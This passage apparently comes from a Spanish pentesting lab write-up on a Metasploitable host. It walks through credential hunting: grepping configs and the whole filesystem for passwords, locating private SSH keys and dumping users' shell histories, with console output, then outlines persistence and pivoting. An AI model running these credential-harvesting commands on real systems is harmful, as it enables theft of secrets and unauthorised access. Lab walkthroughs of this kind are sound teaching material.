/var/www/tikiwiki/templates/tiki-admin-include-login.tpl:<tr><td class="form">{tr}Password invalid after days{/tr}:</td><td><input type="text" name="pass_due" value="{$pass_due|escape}" /></td></tr>
/var/www/tikiwiki/templates/tiki-admin-include-login.tpl:<tr><td class="form">{tr}LDAP Admin Pwd{/tr}:</td><td><input type="password" name="auth_ldap_adminpass" value="{$auth_ldap_adminpass|escape}" /></td></tr>
/var/www/tikiwiki/templates/tiki-admin_forums.tpl:<tr><td class="formcolor">{tr}Password protected{/tr}</td><td class="formcolor">
/var/www/tikiwiki/templates/tiki-admin_forums.tpl:<select name="forum_use_password">
/var/www/tikiwiki/templates/tiki-admin_forums.tpl:<option value="n" {if $forum_use_password eq 'n'}selected="selected"{/if}>{tr}No{/tr}</option>
/var/www/tikiwiki/templates/tiki-admin_forums.tpl:<option value="t" {if $forum_use_password eq 't'}selected="selected"{/if}>{tr}Topics only{/tr}</option>
/var/www/tikiwiki/templates/tiki-admin_forums.tpl:<option value="a" {if $forum_use_password eq 'a'}selected="selected"{/if}>{tr}All posts{/tr}</option>
/var/www/tikiwiki/templates/tiki-admin_forums.tpl:<tr><td class="formcolor">{tr}Forum password{/tr}</td><td class="formcolor"><input type="text" name="forum_password" value="{$forum_password|escape}" /></td></tr>
/var/www/tikiwiki/templates/tiki-admin_forums.tpl:                      <td class="formcolor">{tr}Password{/tr}:</td>
/var/www/tikiwiki/templates/tiki-admin_forums.tpl:                      <td><input type="password" name="inbound_pop_password" value="{$inbound_pop_password|escape}" /></td>
/var/www/tikiwiki/templates/tiki-quiz_stats_quiz.tpl:<td class="odd">{if $channels[user].ispassing}{tr}P{/tr}{else}{tr}F{/tr}{/if}</td>
/var/www/tikiwiki/templates/tiki-quiz_stats_quiz.tpl:<td class="odd">{if $channels[user].ispassing}{tr}P{/tr}{else}{tr}F{/tr}{/if}</td>
/var/www/tikiwiki/templates/tiki-admin_mailin.tpl:      <td>{tr}Password{/tr}</td>
/var/www/tikiwiki/templates/tiki-admin_mailin.tpl:      <td colspan="3"><input type="password" name="pass" value="{$info.pass|escape}" /></td>
/var/www/tikiwiki/templates/tiki-newsreader_groups.tpl:  <td class="{cycle advance=false}"><a class="link" href="tiki-newsreader_news.php?server={$info.server}&amp;port={$info.port}&amp;username={$info.username}&amp;password={$info.password}&amp;group={$group}&amp;offset=0&amp;serverId={$serverId}&amp;serverId={$serverId}">{$group}</a></td>
/var/www/tikiwiki/templates/tiki-change_password.tpl:<h1>{tr}Change password enforced{/tr}</h1>
/var/www/tikiwiki/templates/tiki-change_password.tpl:<form method="post" action="tiki-change_password.php" >
/var/www/tikiwiki/templates/tiki-change_password.tpl:  <td class="formcolor">{tr}Old password{/tr}:</td>
/var/www/tikiwiki/templates/tiki-change_password.tpl:  <td class="formcolor"><input type="password" name="oldpass" value="{$oldpass|escape}" /></td>
/var/www/tikiwiki/templates/tiki-change_password.tpl:  <td class="formcolor">{tr}New password{/tr}:</td>
/var/www/tikiwiki/templates/tiki-change_password.tpl:  <td class="formcolor"><input type="password" name="pass" /></td>
/var/www/tikiwiki/templates/tiki-change_password.tpl:  <td class="formcolor"><input type="password" name="pass2" /></td>
/var/www/tikiwiki/templates/tiki-remind_password.tpl:<h1>{tr}I forgot my password{/tr}</h1>
/var/www/tikiwiki/templates/tiki-remind_password.tpl:  <form action="tiki-remind_password.php" method="post">
/var/www/tikiwiki/templates/tiki-remind_password.tpl:                                 value="{tr}send me my password{/tr}" /></td>
/var/www/tikiwiki/templates/tiki-remind_password.tpl:{tr}Important: Username & password are CaSe SenSitiVe{/tr}
/var/www/tikiwiki/templates/tiki-newsreader_servers.tpl:  <td class="formcolor">{tr}Password{/tr}</td>
/var/www/tikiwiki/templates/tiki-newsreader_servers.tpl:  <td class="formcolor"><input type="password" name="password" value="{$info.password|escape}" /></td>
/var/www/tikiwiki/templates/tiki-admin-include-general.tpl:    {tr}Change admin password{/tr}
/var/www/tikiwiki/templates/tiki-admin-include-general.tpl:        <td class="form" ><label for="general-new_pass">{tr}New password{/tr}:</label></td>
/var/www/tikiwiki/templates/tiki-admin-include-general.tpl:        <td ><input type="password" name="adminpass" id="general-new_pass" /></td>
/var/www/tikiwiki/templates/tiki-admin-include-general.tpl:        <td class="form"><label for="general-repeat_pass">{tr}Repeat password{/tr}:</label></td>
/var/www/tikiwiki/templates/tiki-admin-include-general.tpl:        <td><input type="password" name="again" id="general-repeat_pass" /></td>
/var/www/tikiwiki/templates/tiki-admin-include-general.tpl:          <input type="submit" name="newadminpass" value="{tr}Change password{/tr}" />
/var/www/tikiwiki/templates/tiki-view_forum.tpl:    {if $forum_info.forum_use_password ne 'n'}
/var/www/tikiwiki/templates/tiki-view_forum.tpl:        <td>{tr}Password{/tr}</td>
/var/www/tikiwiki/templates/tiki-view_forum.tpl:                <input type="password" name="password" />
/var/www/tikiwiki/templates/tiki-send_objects.tpl:<tr><td class="form">{tr}password{/tr}:</td><td class="form"><input type="password" name="password" value="{$password|escape}" /></td></tr>
/var/www/tikiwiki/templates/tiki-send_objects.tpl:<input type="hidden" name="password" value="{$password|escape}" />
/var/www/tikiwiki/templates/tiki-send_objects.tpl:<input type="hidden" name="password" value="{$password|escape}" />
/var/www/tikiwiki/templates/tiki-webmail.tpl:<tr><td class="formcolor">{tr}Password{/tr}</td><td colspan="3" class="formcolor"><input type="password" name="pass" value="{$info.pass|escape}" /></td></tr>
/var/www/tikiwiki/templates/tiki-newsreader_read.tpl:<h1><a class="pagetitle" href="tiki-newsreader_read.php?offset={$offset}&amp;id={$id}&amp;serverId={$serverId}&amp;server={$server}&amp;port={$port}&amp;username={$username}&amp;password={$password}&amp;group={$group}">{tr}Reading article from{/tr}:{$group}</a></h1>
/var/www/tikiwiki/templates/tiki-newsreader_read.tpl:<a class="linkbut" href="tiki-newsreader_news.php?serverId={$serverId}&amp;server={$server}&amp;port={$port}&amp;username={$username}&amp;password={$password}&amp;group={$group}&amp;offset={$offset}">{tr}Back to list of articles{/tr}</a>
/var/www/tikiwiki/templates/tiki-newsreader_read.tpl:<a class="link" href="tiki-newsreader_read.php?offset={$offset}&amp;id={$first}&amp;serverId={$serverId}&amp;server={$server}&amp;port={$port}&amp;username={$username}&amp;password={$password}&amp;group={$group}"><img src='img/icons2/nav_first.gif' border='0' alt='{tr}First{/tr}' title='{tr}First{/tr}' /></a>
/var/www/tikiwiki/templates/tiki-newsreader_read.tpl:{if $prev_article > 0}<a class="link" href="tiki-newsreader_read.php?offset={$offset}&amp;id={$prev_article}&amp;serverId={$serverId}&amp;server={$server}&amp;port={$port}&amp;username={$username}&amp;password={$password}&amp;group={$group}"><img src='img/icons2/nav_dot_right.gif' border='0' alt='{tr}Prev{/tr}' title='{tr}Prev{/tr}' /></a>{/if}
/var/www/tikiwiki/templates/tiki-newsreader_read.tpl:{if $next_article > 0}<a class="link" href="tiki-newsreader_read.php?offset={$offset}&amp;id={$next_article}&amp;serverId={$serverId}&amp;server={$server}&amp;port={$port}&amp;username={$username}&amp;password={$password}&amp;group={$group}"><img src='img/icons2/nav_dot_left.gif' border='0' alt='{tr}Next{/tr}' title={tr}Next{/tr}' /> </a>{/if}
/var/www/tikiwiki/templates/tiki-newsreader_read.tpl:<a class="link" href="tiki-newsreader_read.php?offset={$offset}&amp;id={$last}&amp;serverId={$serverId}&amp;server={$server}&amp;port={$port}&amp;username={$username}&amp;password={$password}&amp;group={$group}"><img src='img/icons2/nav_last.gif' border='0' alt='{tr}Last{/tr}' title='{tr}Last{/tr}' /></a>
/var/www/tikiwiki/templates/tiki-newsreader_read.tpl:   <a title="{tr}Save to notepad{/tr}" href="tiki-newsreader_read.php?offset={$offset}&amp;id={$id}&amp;serverId={$serverId}&amp;server={$server}&amp;port={$port}&amp;username={$username}&amp;password={$password}&amp;group={$group}&amp;savenotepad=1">{html_image file='img/icons/ico_save.gif' border='0' alt='{tr}save{/tr}'}</a>
/var/www/tikiwiki/templates/tiki-adminusers.tpl:    <i>{tr}Warning: changing the username will require the user to change his password and will mess with slave intertiki sites that use this one as master{/tr}</i>
/var/www/tikiwiki/templates/tiki-adminusers.tpl:    <i>{tr}Warning: changing the username will require the user to change his password{/tr}</i>
/var/www/tikiwiki/templates/tiki-adminusers.tpl:<tr class="formcolor"><td>{tr}Pass{/tr}:</td><td><input type="password" name="pass" id="pass" /></td></tr>
/var/www/tikiwiki/templates/tiki-adminusers.tpl:<tr class="formcolor"><td>{tr}Again{/tr}:</td><td><input type="password" name="pass2" id="pass2" /></td></tr>
/var/www/tikiwiki/templates/tiki-adminusers.tpl:<tr class="formcolor"><td>{tr}Batch upload (CSV file<a {popup text='login,password,email,groups<br />user1,password1,email1,&quot;group1,group2&quot;<br />user2, password2,email2'}><img src="img/icons/help.gif" border="0" height="16" width="16" alt='{tr}help{/tr}' /></a>){/tr}:</td><td><input type="file" name="csvlist"/><br />{tr}Overwrite{/tr}: <input type="checkbox" name="overwrite" checked="checked" /></td></tr>
/var/www/tikiwiki/templates/tiki-adminusers.tpl:<a class="link" href="javascript:genPass('genepass','pass','pass2');">{tr}Generate a password{/tr}</a></td>
/var/www/tikiwiki/templates/tiki-adminusers.tpl:<td><input id='genepass' type="text" /></td></tr>
/var/www/tikiwiki/templates/tiki-register.tpl:<input type="hidden" name="pass" value="{$password}"/>
/var/www/tikiwiki/templates/tiki-register.tpl:{if $useRegisterPasscode eq 'y'}
/var/www/tikiwiki/templates/tiki-register.tpl:<tr><td class="formcolor">{tr}Passcode to register (not your user password){/tr}:</td><td class="formcolor"><input type="password" name="passcode" /></td></tr>
/var/www/tikiwiki/templates/tiki-register.tpl:<tr><td class="formcolor">{tr}Password{/tr}:</td><td class="formcolor"><input id='pass1' type="password" name="pass" /></td></tr>
/var/www/tikiwiki/templates/tiki-register.tpl:<tr><td class="formcolor">{tr}Repeat password{/tr}:</td><td class="formcolor"><input id='pass2' type="password" name="passAgain" /></td></tr>
/var/www/tikiwiki/templates/tiki-register.tpl:<tr><td class="formcolor"><a class="link" href="javascript:genPass('genepass','pass1','pass2');">{tr}Generate a password{/tr}</a></td>
/var/www/tikiwiki/templates/tiki-register.tpl:<td class="formcolor"><input id='genepass' type="text" /></td></tr>
/var/www/tikiwiki/templates/tiki-newsreader_news.tpl:<h1><a class="pagetitle" href="tiki-newsreader_news.php?serverId={$serverId}&amp;server={$server}&amp;port={$port}&amp;username={$username}&amp;password={$password}&amp;group={$group}">{tr}News from{/tr}:{$group}</a></h1>
/var/www/tikiwiki/templates/tiki-newsreader_news.tpl:<a class="linkbut" href="tiki-newsreader_news.php?serverId={$serverId}&amp;server={$server}&amp;port={$port}&amp;username={$username}&amp;password={$password}&amp;group={$group}&amp;mark=1&amp;offset={$offset}">{tr}Save position{/tr}</a>
/var/www/tikiwiki/templates/tiki-newsreader_news.tpl:<td class="{cycle advance=false}" {if $articles[ix].status eq 'new'} style="font-weight:bold" {/if}><a class="link" href="tiki-newsreader_read.php?server={$server}&amp;port={$port}&amp;username={$username}&amp;password={$password}&amp;group={$group}&amp;offset={$offset}&amp;id={$articles[ix].loopid}&amp;serverId={$serverId}">{$articles[ix].Subject}</a></td>
/var/www/tikiwiki/templates/tiki-newsreader_news.tpl:[<a class="prevnext" href="tiki-newsreader_news.php?server={$server}&amp;port={$port}&amp;username={$username}&amp;password={$password}&amp;group={$group}&amp;offset={$prev_offset}">{tr}prev{/tr}</a>]&nbsp;
/var/www/tikiwiki/templates/tiki-newsreader_news.tpl:&nbsp;[<a class="prevnext" href="tiki-newsreader_news.php?server={$server}&amp;port={$port}&amp;username={$username}&amp;password={$password}&amp;group={$group}&amp;offset={$next_offset}">{tr}next{/tr}</a>]
/var/www/tikiwiki/templates/tiki-newsreader_news.tpl:<a class="prevnext" href="tiki-newsreader_news.php?server={$server}&amp;port={$port}&amp;username={$username}&amp;password={$password}&amp;group={$group}&amp;offset=selector_offset">
/var/www/tikiwiki/templates/tiki-user_preferences.tpl:  {if $change_password neq 'n'}{tr}Leave "New password" and "Confirm new password" fields blank to keep current password{/tr}{/if}
/var/www/tikiwiki/templates/tiki-user_preferences.tpl:  {if $change_password neq 'n'}
/var/www/tikiwiki/templates/tiki-user_preferences.tpl:  <tr><td class="form">{tr}New password{/tr}:</td><td class="form"><input type="password" name="pass1" /></td></tr>
/var/www/tikiwiki/templates/tiki-user_preferences.tpl:  <tr><td class="form">{tr}Confirm new password{/tr}:</td><td class="form"><input type="password" name="pass2" /></td></tr>
/var/www/tikiwiki/templates/tiki-user_preferences.tpl:    <tr><td class="form">{tr}Current password (required){/tr}:</td><td class="form"><input type="password" name="pass" /></td></tr>
/var/www/tikiwiki/templates/tiki-edit_quiz.tpl:<label for="quiz-passingperct">{tr}Passing Percentage{/tr}</label>
/var/www/tikiwiki/templates/tiki-edit_quiz.tpl:<input type="text" name="passingperct" id="quiz-passingperct" size=3 maxlength=3 value="{$passingperct}" />
/var/www/tikiwiki/templates/tiki-install.tpl:<td>Password:</td>
/var/www/tikiwiki/templates/tiki-install.tpl:<input type="password" name="pass" />
/var/www/tikiwiki/templates/tiki-install.tpl:Database password
/var/www/tikiwiki/templates/tiki-install.tpl:               Please enter your admin password to continue<br /><br />
/var/www/tikiwiki/templates/tiki-install.tpl:          <tr><td class="module">{tr}pass{/tr}:</td></tr>
/var/www/tikiwiki/templates/tiki-install.tpl:          <tr><td><input type="password" name="pass" size="20" /></td></tr>
/var/www/tikiwiki/templates/tiki-install.tpl:                   this is your first install your admin password is 'admin'. You can
/var/www/tikiwiki/tiki-admin_mailin.php:function account_ok($pop, $user, $pass) {
/var/www/tikiwiki/tiki-admin_mailin.php:        //$pop3 = new POP3($pop, $user, $pass);
/var/www/tikiwiki/tiki-admin_mailin.php:        $pop3->login($user, $pass);
/var/www/tikiwiki/tiki-admin_mailin.php:        if (!account_ok($_REQUEST["pop"], $_REQUEST["username"], $_REQUEST["pass"]))
/var/www/tikiwiki/tiki-admin_mailin.php:                        $_REQUEST["username"], $_REQUEST["pass"], $_REQUEST["smtp"], $_REQUEST["useAuth"], $_REQUEST["smtpPort"], $_REQUEST["type"],
/var/www/tikiwiki/tiki-admin_mailin.php:        $info["pass"] = '';
/var/www/tikiwiki/tiki-error_simple.php:pass: <input type="password" name="pass" size="20" /><br />


##### 6. Configuración de MySQL (normalmente en /etc/mysql/ o /var/lib/mysql/):

Este comando apunta directamente al corazón de la configuración de MySQL. Buscamos contraseñas en /etc/mysql/ para revelar credenciales de acceso a bases de datos, usuarios root, configuraciones de replicación, etc. 

```bash
grep -ri 'password' /etc/mysql/ 2>/dev/null
```

Escaneamos recursivamente todos los archivos en /etc/mysql/ buscando cualquier linea que contenga 'password', ignorando mayúsculas y minúsculas.

###### ¿Qué podemos encontrar?

- Contraseñas de acceso a MySQL en archivos como **my.cnf**, **debian.cnf**, o scripts de backup.
- Credenciales de usuarios internos o de servicios automatizados.
- Pistas sobre configuraciones inseguras o accesos sin contraseña.

Resultado en consola:

/etc/mysql/debian.cnf:password = 
/etc/mysql/debian.cnf:password = 
/etc/mysql/my.cnf:# It has been reported that passwords should be enclosed with ticks/quotes
/etc/mysql/conf.d/old_passwords.cnf:old_passwords = false


##### 7. Configuración de PostgreSQL (normalmente en /etc/postgresql/):

Este comando apunta a la configuración de PostgreSQL, otro sistema de gestión de bases de datos muy utilizado en entornos Linux. Buscar 'password' en /etc/postgresql/ puede revelar credenciales de acceso, configuraciones de autenticación, y parámetros de seguridad.

```bash
grep -ri 'password' /etc/postgresql/ 2>/dev/null
```

Esto escanea todos los archivos de configuración de PostgreSQL en busca de líneas que contengan 'password', ignorando mayúsculas/minúsculas.

Resultado en consola:

/etc/postgresql/8.3/main/postgresql.conf:#password_encryption = on
/etc/postgresql/8.3/main/pg_hba.conf:# METHOD can be "trust", "reject", "md5", "crypt", "password", "gss", "sspi",
/etc/postgresql/8.3/main/pg_hba.conf:# "krb5", "ident", "pam" or "ldap".  Note that "password" sends passwords
/etc/postgresql/8.3/main/pg_hba.conf:# in clear text; "md5" is preferred since it sends encrypted passwords.

Y, para filtrar lo más relevante:

```bash
grep -i 'password' pgsql_passwords.txt
```

###### 🧠 ¿Qué hay de interesante en /etc/postgresql/?

- pg_hba.conf: controla cómo los usuarios se autentican (puede contener métodos como md5, password, trust, etc.).
- postgresql.conf: configuración general del servidor, a veces incluye rutas a archivos con credenciales.
- Scripts o archivos .sql: pueden incluir comandos con contraseñas embebidas.
- Usuarios del sistema: PostgreSQL puede tener usuarios específicos con contraseñas definidas en archivos de configuración o scripts de inicialización.

#### 🔍 Bloque 4 – Archivos de usuarios

Aquí buscamos credenciales en el home de cada usuario, por ejemplo en archivos .bash_history, .ssh/, .git-credentials, etc.

##### 8. Buscar claves SSH privadas:

```bash
find /home/ -name "id_rsa"
```

Resultado en consola:

/home/msfadmin/.ssh/id_rsa

##### 9. Buscar en historial de comandos

Este script recorre los directorios /root/ y todos los /home/*, y si encuentra un archivo .bash_history, lo muestra. Este archivo contiene los comandos que cada usuario ha ejecutado en su terminal.

```bash
for user in /root /home/*; do
  if [ -f "$user/.bash_history" ]; then
    echo "Historial de $user:"
    cat "$user/.bash_history"
  fi
done
```

Resultado en consola:

telnet 192.168.56.102 3306
mysql -h 192.168.56.102 -u msfadmin -p
mysql -h 192.168.56.102 -u user -p
mysql -h 192.168.56.102 -u user -p
cat /etc/mysql/my.cnf
cat /etc/mysql/debian.cnf
whoami
cat /etc/mysql/debian.cnf
whoami
msfconsole

###### 🔍 Explicación:

- **telnet 192.168.56.102 3306**: Intenta conectarse al puerto de MySQL vía Telnet.
- **mysql -h ... -u ... -p**: Intentos de conexión a MySQL con los usuarios **msfadmin** y **user**.
- **cat /etc/mysql/...**: lectura de archivos de configuración de MySQL, posiblemente buscando contraseñas.
- **whoami**: verifica el usuario actual.
- **msfconsole**: abre Metasploit Framework, lo que indica actividad de pentesting.

###### 📂 Historial de /home/user

```bash
ssh-keygen -t dsa
ls
cd .ssh
ls
sudo -s
cd /home/user
ls
ls
ls .ssh
clear
ls .ssh
sudo cat "/.ssh/id_dsa.pub >> /home/msfadmin/.ssh/authorized_keys
sudo -s
exit
```

###### 🔍 Explicación:

- ssh-keygen -t dsa: genera una clave SSH tipo DSA (ya obsoleta, pero útil en entornos antiguos).
- cd .ssh / ls: navega por el directorio de claves SSH.
- sudo -s: intenta obtener una shell como root.
- sudo cat "... >> /home/msfadmin/.ssh/authorized_keys: intenta copiar su clave pública al usuario msfadmin para acceso sin contraseña vía SSH.
- exit: termina la sesión.

⚠️ El comando sudo cat "... >> ... tiene una comilla mal cerrada, lo que sugiere que fue mal ejecutado o copiado.

###### 🧠 ¿Qué revela esta información?

- Hay intentos claros de acceso a MySQL con distintos usuarios.
- Se han consultado archivos sensibles como debian.cnf, que a menudo contienen contraseñas en texto plano.
- El usuario user intentó establecer acceso persistente vía SSH al usuario msfadmin, lo que puede indicar una escalada de privilegios o persistencia post-explotación.
- Se ha usado Metasploit, lo que confirma que el sistema está siendo usado para pruebas de penetración.



##### 10. Buscar en todo el sistema cualquier archivo que contenga 'password='

Este comando es una joya para buscar credenciales ocultas en texto plano.

```bash
grep -ri 'password=' / 2>/dev/null
```

Este comando puede revelar lineas como:

```bash
db_password=supersecret123
password=admin123
ftp_password="hunter2"
```
Y se pueden encontrar en:

- Archivos de configuración: .conf, .ini, .env
- Scripts: .sh, .py, .php
- Logs mal configurados.
- Backups o archivos temporales.

###### ⚠️ Advertencias importantes:

- **Privilegios:** Para que el comando sea realmente efectivo, debemos ejecutarlo como ***root***, ya que muchos archivos están protegidos.
- **Falsos positivos:** No todo lo que contiene passsword= es una credencial válida. A veces son ejemplos, comentarios o valores vacíos.
- **Volumen de datos:** Puede generar mucha salida, así que conviene redirigirlo a un archivo para analizarlo después.

###### 🧠 ¿Por qué es útil en pentesting?

- Te permite descubrir credenciales en texto plano que los administradores olvidaron cifrar.
- Es una técnica rápida para encontrar acceso a bases de datos, FTP, SSH, APIs, etc.
- Puede revelar errores de configuración que comprometen la seguridad del sistema.

Resultado en consola:

root@metasploitable:# grep -ri 'password=' / 2>/dev/null
Binary file /usr/lib/jvm/java-6-openjdk/jre/lib/security/cacerts matches
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';
/etc/phpmyadmin/config-db.php:$dbpass='password';



### 3️⃣ Persistencia

Objetivo: asegurarnos de que podemos volver a entrar incluso si cambian contraseñas o cierran VNC.

Opciones:

- Crear un nuevo usuario root.
- Configurar un servicio que nos dé acceso remoto.
- Añadir una llave SSH para acceso posterior.

### 4️⃣ Pivoting

Objetivo: usar la máquina comprometida como puente para llegar a otras en la red interna.

Pasos:

- Descubrir otras máquinas en la red desde Metasploitable.
- Usar nmap desde la propia víctima.
- Ver si hay rutas de acceso a redes diferentes.

